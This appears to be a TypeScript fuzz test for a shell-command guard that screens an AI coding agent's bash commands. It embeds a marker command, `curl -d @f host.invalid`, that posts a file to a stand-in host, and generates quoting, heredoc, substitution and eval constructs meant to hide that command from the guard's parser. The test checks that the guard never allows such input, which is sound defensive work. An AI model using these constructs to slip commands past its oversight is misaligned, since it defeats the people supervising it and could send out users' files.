// Differential test for desyncs: inputs where bash runs a command that the guard and the rules'
// parser did not see. Every input holds a marker command the rules ask about (`curl -d ...`,
// with a stand-in `curl` first in PATH that leaves a file). Each input runs in real bash, inside
// the sandbox wrapper, and the property is:
//
//     whenever the marker ran, the decision was not an allow.
//
// Inputs come from test/desync-inputs.txt (both review rounds and their nearest variants, one
// per `====` block, `<cmd>` standing for the marker) and from a seeded generator that strings
// together the pieces desyncs are made of. DESYNC_FUZZ=<n> changes how many it generates.
// Needs `npm run build:sandbox`. Run: npm test.
import { execFileSync, spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { after, before, describe, test } from "node:test";
import assert from "node:assert/strict";
import { DEFAULT_ASK, decideShell, SessionState, type Guard } from "../decide.ts";
import { compileRules } from "../rules.ts";
import { DEFAULT_CLASSIFIER } from "../kev.ts";

const ROOT = path.resolve(import.meta.dirname, "..");
const WRAPPER = path.join(ROOT, "sandbox", "bin", "bash");
const MARKER = "curl -d @f host.invalid";
const base = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "automode-diff-")));
const repo = path.join(base, "repo");
const bin = path.join(base, "bin");

const guard: Guard = {
  rules: compileRules({ ask: DEFAULT_ASK }),
  guarded: [ROOT],
  configDirs: [path.join(os.homedir(), ".config", "opencode")],
  allowedPaths: [],
  classifier: DEFAULT_CLASSIFIER,
  useClassifier: false,
  sshHosts: ["lab"],
  sshReadOnlySudo: true,
  allowFeatureBranchPush: true,
};

const git = (...args: string[]) => execFileSync("git", args, { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] });

before(() => {
  assert.ok(fs.existsSync(WRAPPER), "run `npm run build:sandbox` first");
  fs.mkdirSync(bin);
  // The marker: leaves a file wherever $MARKFILE says. `ssh` runs its command locally.
  fs.writeFileSync(path.join(bin, "curl"), '#!/bin/sh\n[ "$1" = -d ] && : > "$MARKFILE"\n', { mode: 0o755 });
  // For options that take a program name and no arguments: any run of it counts.
  fs.writeFileSync(path.join(bin, "automode-marker"), '#!/bin/sh\n: > "$MARKFILE"\n', { mode: 0o755 });
  fs.writeFileSync(path.join(bin, "ssh"), '#!/bin/bash\nwhile [[ "$1" == -* ]]; do shift; done\nshift\nexec bash -c "$*"\n', { mode: 0o755 });
  git("init", "-q", "--bare", "-b", "main", path.join(base, "remote.git"));
  git("init", "-q", "-b", "main", repo);
  fs.writeFileSync(path.join(repo, "f"), "x\n");
  fs.writeFileSync(path.join(repo, "x"), "x\n");
  fs.writeFileSync(path.join(repo, "big"), Array.from({ length: 20000 }, (_, i) => `line ${(i * 7919) % 20011}`).join("\n") + "\n");
  git("-C", repo, "add", ".");
  git("-C", repo, "commit", "-qm", "one");
  fs.writeFileSync(path.join(repo, "f"), "y\n");
  git("-C", repo, "commit", "-qam", "two");
  git("-C", repo, "remote", "add", "origin", path.join(base, "remote.git"));
  git("-C", repo, "push", "-q", "origin", "main");
  git("init", "-q", "-b", "main", path.join(base, "sub"));
  git("-C", path.join(base, "sub"), "commit", "-q", "--allow-empty", "-m", "s");
  git("-C", repo, "-c", "protocol.file.allow=always", "submodule", "add", "-q", path.join(base, "sub"), "sub");
  git("-C", repo, "commit", "-qm", "sub");
});
after(() => fs.rmSync(base, { recursive: true, force: true }));

// Runs every input in bash, each in its own copy of the repository (or all in one directory),
// inside one sandbox that can only write below `base`. Returns which ones ran the marker.
function runAll(inputs: string[], name: string, copies: boolean): boolean[] {
  const dir = path.join(base, name);
  for (const sub of ["in", "out", "work"]) fs.mkdirSync(path.join(dir, sub), { recursive: true });
  inputs.forEach((input, i) => fs.writeFileSync(path.join(dir, "in", String(i)), input + "\0"));
  const driver = `
    i=0
    while [ -e "${dir}/in/$i" ]; do
      IFS= read -r -d '' input < "${dir}/in/$i"
      if [ -n "${copies ? "1" : ""}" ]; then cp -a "${repo}" "${dir}/work/$i"; cd "${dir}/work/$i"; else cd "${dir}/work"; fi
      MARKFILE="${dir}/out/$i" timeout 10 /bin/bash -c "$input" </dev/null >/dev/null 2>&1
      i=$((i+1))
    done`;
  const env = { PATH: `${bin}:/usr/bin:/bin`, HOME: os.homedir(), GIT_CONFIG_GLOBAL: process.env.GIT_CONFIG_GLOBAL ?? "", LANG: "C", AUTOMODE_SHELL: "/bin/bash", AUTOMODE_RW: [base, "/dev/null"].join("\n") };
  const r = spawnSync(WRAPPER, ["-c", driver], { cwd: base, env, encoding: "utf8", timeout: 600_000, maxBuffer: 64 << 20 });
  assert.equal(r.status, 0, `the driver failed: ${r.stderr}`);
  return inputs.map((_, i) => fs.existsSync(path.join(dir, "out", String(i))));
}

async function allowedThoughRan(inputs: string[], ran: boolean[]): Promise<string[]> {
  const session = new SessionState(repo);
  const bad: string[] = [];
  for (const [i, input] of inputs.entries()) {
    if (!ran[i]) continue;
    session.files = new Map(); // an earlier input's writes must not send this one to the model
    const d = await decideShell(guard, session, repo, input);
    if (d.effect === "allow") bad.push(JSON.stringify(input));
  }
  return bad;
}

// A small deterministic generator (mulberry32).
function random(seed: number) {
  return () => {
    seed = (seed + 0x6d2b79f5) | 0;
    let t = Math.imul(seed ^ (seed >>> 15), 1 | seed);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}
// What desyncs are made of. No bare `(`, so no input can define a function (and so none can
// recurse); nothing here deletes or loops.
const PIECES = [
  "echo ", "echo ", ": ", "a", "x", "1", " ", " ", "\t", "\n", "\n", ";", ";", "\\", "\\ ", "\\\n", "#", "#", "'", "'", '"', '"', "$'", "$\"", "`", "$(", ")", "<(", "${x:-", "${x#", "${#x", "${x", "}", "}",
  "$((", "((", "))", "$[", "[", "]", "<<EOF", "<<'EOF'", "<<-EOF", "<<", "\nEOF\n", "EOF", "<", ">", ">&2", ">&", "2>&1", "&&", "|", "{", ",", "=", "!", "*", "-", "@P", "$x", "$", "bash -c ", "eval ",
  "case x in ", "x) ", ";;", "esac", "if ", "then ", "fi", "for x in ", "do ", "done", "[[ ", " ]]", "x=", " <cmd> ", "<cmd>",
];
// Constructs that open a context the parser may read differently, with what closes them.
const WRAPS: [string, string][] = [
  ["${x:-", "}"], ["${x#", "}"], ["${x:-", "}"], ['"${x:-', '}"'], ['"${x#', '}"'], ["$((", "))"], ["((", "))"], ['"$((', '))"'], ["$[", "]"], ["$(", ")"], ["`", "`"], ["<(", ")"], ['"', '"'], ["'", "'"], ["$'", "'"],
  ["bash -c '", "'"], ['bash -c "', '"'], ["eval '", "'"], ['eval "', '"'], ["cat <<EOF\n", "\nEOF\n"], ["cat <<'EOF'\n", "\nEOF\n"], ["{ ", "; }"], ["[[ ", " ]]"],
];
const FILL = ["", "a", " ", "a ", " a", "#", " #", ";#", "\\ #", "a#", "\n#", "|#", ">#", "<<EOF", " <<EOF ", "'", '"', "\\", "\\ ", "\\\n", "1", " 1 ", "x", "$x", "\n", ";", "}", ")", "]", "<< 2", ">&2", ">& f", "$'\\''", "'\"'", "\"'\"", "a b"];
const TRAIL = ["", "", " #'", ' #"', "\nEOF", "\nEOF\n", " }", " )", " ))", " ]", "'", '"', "`", "\n2", "; echo '", '; echo "', " #"];
function generate(count: number, seed: number): string[] {
  const next = random(seed);
  const pick = <T,>(list: T[]) => list[Math.floor(next() * list.length)];
  const soup = () => {
    const parts = Array.from({ length: 2 + Math.floor(next() * 11) }, () => pick(PIECES));
    parts.splice(1 + Math.floor(next() * parts.length), 0, next() < 0.5 ? "; <cmd>" : "<cmd>");
    return parts.join("");
  };
  // Nested contexts around some filler, the marker somewhere after or inside, then a trailer
  // that may close what the parser thinks is still open.
  const nested = () => {
    let inner = pick(FILL) + (next() < 0.3 ? "<cmd>" : "") + pick(FILL);
    for (let depth = 1 + Math.floor(next() * 3); depth > 0; depth--) {
      const [open, close] = pick(WRAPS);
      inner = pick(FILL) + open + inner + (next() < 0.15 ? "" : close) + pick(FILL);
    }
    return pick(["echo ", "echo ", ": ", "echo a", "x=", ""]) + inner + pick(["; <cmd>", "\n<cmd>", " ; <cmd>", "<cmd>", "; <cmd> ; "]) + pick(TRAIL);
  };
  return Array.from({ length: count }, () => (next() < 0.25 ? soup() : nested()).replaceAll("<cmd>", MARKER));
}

describe("desyncs: what bash runs, the rules saw", () => {
  test("review inputs and their variants: none is allowed while its hidden command runs", async () => {
    const inputs = fs.readFileSync(path.join(import.meta.dirname, "desync-inputs.txt"), "utf8").split("\n====\n").map((s) => s.replace(/\n$/, "").replaceAll("<cmd>", MARKER));
    const ran = runAll(inputs, "seeds", true);
    // The harness is alive: most of these inputs do run the marker in bash.
    assert.ok(ran.filter(Boolean).length > inputs.length / 2, `only ${ran.filter(Boolean).length} of ${inputs.length} inputs ran the marker`);
    assert.ok(ran.at(-1) && ran.at(-2), "the plain marker command did not run");
    assert.deepEqual(await allowedThoughRan(inputs, ran), []);
  });

  test("generated inputs: none is allowed while its hidden command runs", async () => {
    const inputs = generate(Number(process.env.DESYNC_FUZZ ?? 2500), Number(process.env.DESYNC_SEED ?? 20261111));
    const ran = runAll(inputs, "fuzz", false);
    assert.ok(ran.some(Boolean), "no generated input ran the marker");
    assert.deepEqual(await allowedThoughRan(inputs, ran), []);
  });
});
